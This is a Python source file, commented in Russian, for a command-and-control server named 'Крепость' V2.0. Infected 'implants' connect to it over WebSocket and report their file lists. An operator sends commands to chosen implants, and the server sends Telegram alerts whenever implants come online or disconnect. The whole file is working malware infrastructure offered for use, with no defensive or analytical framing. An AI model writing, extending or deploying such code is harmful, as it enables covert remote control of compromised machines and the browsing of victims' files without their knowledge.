#
# --- Файл: c2_server.py (Версия 2.0) ---
#
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    """Асинхронно отправляет сообщение в Telegram в отдельном потоке."""
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] Ошибка отправки в Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(); await ws.prepare(request)
    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] Оператор подключился.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = {
                "ws": ws,
                "files": initial_msg.get('files', {}),
                "volume": initial_msg.get('current_volume', 50)
            }
            print(f"[+] Новый имплант онлайн: {client_id}")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {
                            "files": IMPLANTS[target_id].get("files"),
                            "volume": IMPLANTS[target_id].get("volume")
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            if OPERATOR:
                                await broadcast_bot_list() # На всякий случай, если бот был в офлайне
                                await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except asyncio.TimeoutError:
        print("[!] Таймаут получения начального сообщения.")
    except Exception as e:
        print(f"[!] Ошибка в websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] Имплант отключился: {client_id}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] Оператор отключился.")
    return ws

async def broadcast_bot_list():
  """
  Рассылает обновленный список ботов ТОЛЬКО ЕСЛИ оператор на месте.
  """
  # <<< ГЛАВНОЕ ИЗМЕНЕНИЕ: ПРОВЕРЯЕМ, ЖИВ ЛИ ОПЕРАТОР
  if OPERATOR and not OPERATOR.closed:
    bot_ids = list(IMPLANTS.keys())
    print(f"[*] Обновление списка ботов для оператора: {bot_ids}")
    try:
      # Отправляем, только если уверены, что он слушает
      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
    except ConnectionResetError:
      # На случай, если он отключился ровно в эту миллисекунду
      print("[!] Оператор отключился во время отправки списка ботов.")
  else:
    print("[*] Список ботов изменился, но оператор не в сети. Отправка отменена.")

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V2.0) ONLINE ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен вручную.")
    finally:
        send_telegram_message("🛑 Сервер 'Крепость' V2.0 остановлен.")



